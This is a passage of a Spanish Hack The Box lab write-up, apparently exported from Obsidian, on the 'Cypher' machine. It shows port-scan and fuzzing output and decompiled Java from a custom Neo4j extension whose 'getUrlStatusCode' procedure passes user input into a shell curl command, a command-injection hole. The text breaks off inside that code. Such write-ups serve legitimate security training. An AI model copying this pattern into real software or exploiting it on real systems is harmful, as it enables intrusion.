<!DOCTYPE html> <html><head>
		<title>Cypher exploitation</title>
		<base href="../../">
		<meta id="root-path" root-path="../../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="HTB - Cypher exploitation">
		<meta property="og:title" content="Cypher exploitation">
		<meta property="og:description" content="HTB - Cypher exploitation">
		<meta property="og:type" content="website">
		<meta property="og:url" content="machines/cypher/cypher-exploitation.html">
		<meta property="og:image" content="machines/cypher/imgs/pasted-image-20250305182419.png">
		<meta property="og:site_name" content="HTB">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title show-ribbon"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="Nmap ports (TCP sCV)"><p dir="auto">Nmap ports (TCP sCV)</p></h1><div class="el-h1 heading-wrapper"><div class="heading-children"><div class="el-table" dir="ltr" style="overflow-x: auto;"><table>
<thead>
<tr>
<th dir="ltr">Puerto</th>
<th dir="ltr">Servicio</th>
<th dir="ltr">Versión</th>
</tr>
</thead>
<tbody>
<tr>
<td dir="ltr">22/tcp</td>
<td dir="ltr">ssh</td>
<td dir="ltr">OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)</td>
</tr>
<tr>
<td dir="ltr">80/tcp</td>
<td dir="ltr">http</td>
<td dir="ltr">nginx 1.24.0 (Ubuntu)</td>
</tr>
</tbody>
</table></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="Puerto 80" dir="auto" class="heading" id="Puerto_80">Puerto 80</h1><div class="heading-children"><div class="el-p"><p dir="auto"><span alt="Pasted image 20250305182419.png" src="Pasted image 20250305182419.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250305182419.png" src="machines/cypher/imgs/pasted-image-20250305182419.png"></span></p></div><div class="el-hr"><hr></div><div class="el-h2 heading-wrapper"><h2 data-heading="Fuzzing" dir="auto" class="heading" id="Fuzzing"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Fuzzing</h2><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token number">200</span>      GET       63l      139w     1548c http://cypher.htb/utils.js
<span class="token number">200</span>      GET        3l      113w     8123c http://cypher.htb/bootstrap-notify.min.js
<span class="token number">200</span>      GET      126l      274w     3671c http://cypher.htb/login
<span class="token number">200</span>      GET      179l      477w     4986c http://cypher.htb/about
<span class="token number">307</span>      GET        0l        0w        0c http://cypher.htb/demo <span class="token operator">=</span><span class="token operator">&gt;</span> http://cypher.htb/login
<span class="token number">307</span>      GET        0l        0w        0c http://cypher.htb/api <span class="token operator">=</span><span class="token operator">&gt;</span> http://cypher.htb/api/docs
<span class="token number">307</span>      GET        0l        0w        0c http://cypher.htb/api/ <span class="token operator">=</span><span class="token operator">&gt;</span> http://cypher.htb/api/api
<span class="token number">405</span>      GET        1l        3w       31c http://cypher.htb/api/auth
<span class="token number">200</span>      GET        2l     1293w    89664c http://cypher.htb/jquery-3.6.1.min.js
<span class="token number">200</span>      GET       12l     2173w   195855c http://cypher.htb/bootstrap.min.css
<span class="token number">200</span>      GET        7l     1223w    80496c http://cypher.htb/bootstrap.bundle.min.js
<span class="token number">200</span>      GET      162l      360w     4562c http://cypher.htb/index
<span class="token number">200</span>      GET     7333l    24018w   208204c http://cypher.htb/vivagraph.min.js
<span class="token number">301</span>      GET        7l       12w      178c http://cypher.htb/testing <span class="token operator">=</span><span class="token operator">&gt;</span> http://cypher.htb/testing/
<span class="token number">200</span>      GET      876l     4886w   373109c http://cypher.htb/logo.png
<span class="token number">200</span>      GET      162l      360w     4562c http://cypher.htb/
<span class="token number">200</span>      GET       17l      139w     9977c http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
<span class="token number">404</span>      GET        1l        2w       22c http://cypher.htb/demos
<span class="token number">200</span>      GET     5632l    33572w  2776750c http://cypher.htb/us.png

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">En el endpoint <code>/testing</code> nos encontramos una Index:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250305182637.png" src="Pasted image 20250305182637.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250305182637.png" src="machines/cypher/imgs/pasted-image-20250305182637.png"></span><br>
Es un archivo .jar vamos a diseccionarlo para ello vamos a usar la herramienta <a data-tooltip-position="top" aria-label="https://github.com/wlcaption/jadx_gui" rel="noopener nofollow" class="external-link" href="https://github.com/wlcaption/jadx_gui" target="_blank">jadx_gui</a></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250305184500.png" src="Pasted image 20250305184500.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250305184500.png" src="machines/cypher/imgs/pasted-image-20250305184500.png"></span></p></div><div class="el-p"><p dir="auto">En el código descubrimos una extensión personalizada para Neo4j, un sistema de base de datos orientado a grafos.<br>
El jar se compone de dos Clases :</p></div><div class="el-h3 heading-wrapper"><h3 data-heading="HelloWorldProcedure" dir="auto" class="heading" id="HelloWorldProcedure"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>HelloWorldProcedure</h3><div class="heading-children"><div class="el-pre"><pre class="language-java" tabindex="0"><code data-line="0" class="language-java is-loaded"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>cypher<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>apoc</span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Stream</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span></span><span class="token class-name">Description</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span></span><span class="token class-name">Mode</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span></span><span class="token class-name">Name</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span></span><span class="token class-name">Procedure</span></span><span class="token punctuation">;</span>  
  
<span class="token comment">/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/HelloWorldProcedure.class */</span>  
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorldProcedure</span> <span class="token punctuation">{</span>  
    <span class="token annotation punctuation">@Procedure</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"custom.helloWorld"</span><span class="token punctuation">,</span> mode <span class="token operator">=</span> <span class="token class-name">Mode</span><span class="token punctuation">.</span><span class="token constant">READ</span><span class="token punctuation">)</span>  
    <span class="token annotation punctuation">@Description</span><span class="token punctuation">(</span><span class="token string">"A simple hello world procedure"</span><span class="token punctuation">)</span>  
    <span class="token keyword">public</span> <span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HelloWorldOutput</span><span class="token punctuation">&gt;</span></span> <span class="token function">helloWorld</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Name</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token class-name">String</span> greeting <span class="token operator">=</span> <span class="token string">"Hello, "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"!"</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HelloWorldOutput</span><span class="token punctuation">(</span>greeting<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token comment">/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class */</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorldOutput</span> <span class="token punctuation">{</span>  
        <span class="token keyword">public</span> <span class="token class-name">String</span> greeting<span class="token punctuation">;</span>  
  
        <span class="token keyword">public</span> <span class="token class-name">HelloWorldOutput</span><span class="token punctuation">(</span><span class="token class-name">String</span> greeting<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token keyword">this</span><span class="token punctuation">.</span>greeting <span class="token operator">=</span> greeting<span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="[[CustomFunctions]]" dir="auto" class="heading" id="[[CustomFunctions]]"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><a data-href="CustomFunctions" href="machines/cypher/postexploitation/customfunctions.html" class="internal-link" target="_self" rel="noopener nofollow">CustomFunctions</a></h3><div class="heading-children"><div class="el-p"><p dir="auto">La clase <code>CustomFunctions</code> define un procedimiento personalizado (<code>@Procedure</code>) llamado <code>custom.getUrlStatusCode</code>. Este procedimiento tiene como objetivo devolver el código de estado HTTP de una URL proporcionada.</p></div><div class="el-pre"><pre class="language-java" tabindex="0"><code data-line="0" class="language-java is-loaded"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>cypher<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>apoc</span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Stream</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span></span><span class="token class-name">Description</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span></span><span class="token class-name">Mode</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span></span><span class="token class-name">Name</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>neo4j<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span></span><span class="token class-name">Procedure</span></span><span class="token punctuation">;</span>  
  
<span class="token comment">/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions.class */</span>  
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomFunctions</span> <span class="token punctuation">{</span>  
    <span class="token annotation punctuation">@Procedure</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"custom.getUrlStatusCode"</span><span class="token punctuation">,</span> mode <span class="token operator">=</span> <span class="token class-name">Mode</span><span class="token punctuation">.</span><span class="token constant">READ</span><span class="token punctuation">)</span>  
    <span class="token annotation punctuation">@Description</span><span class="token punctuation">(</span><span class="token string">"Returns the HTTP status code for the given URL as a string"</span><span class="token punctuation">)</span>  
    <span class="token keyword">public</span> <span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">StringOutput</span><span class="token punctuation">&gt;</span></span> <span class="token function">getUrlStatusCode</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Name</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http://"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            url <span class="token operator">=</span> <span class="token string">"https://"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> command <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"curl -s -o /dev/null --connect-timeout 1 -w %{http_code} "</span> <span class="token operator">+</span> url<span class="token punctuation">}</span><span class="token punctuation">;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Command: "</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">Process</span> process <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">BufferedReader</span> inputReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">BufferedReader</span> errorReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">StringBuilder</span> errorOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token class-name">String</span> line <span class="token operator">=</span> errorReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token keyword">if</span> <span class="token punctuation">(</span>line <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
                <span class="token keyword">break</span><span class="token punctuation">;</span>  
            <span class="token punctuation">}</span>  
            errorOutput<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
        <span class="token class-name">String</span> statusCode <span class="token operator">=</span> inputReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Status code: "</span> <span class="token operator">+</span> statusCode<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">boolean</span> exited <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token number">10L</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>exited<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            process<span class="token punctuation">.</span><span class="token function">destroyForcibly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            statusCode <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>  
            <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Process timed out after 10 seconds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  
            <span class="token keyword">int</span> exitCode <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token keyword">if</span> <span class="token punctuation">(</span>exitCode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
                statusCode <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>  
                <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Process exited with code "</span> <span class="token operator">+</span> exitCode<span class="token punctuation">)</span><span class="token punctuation">;</span>  
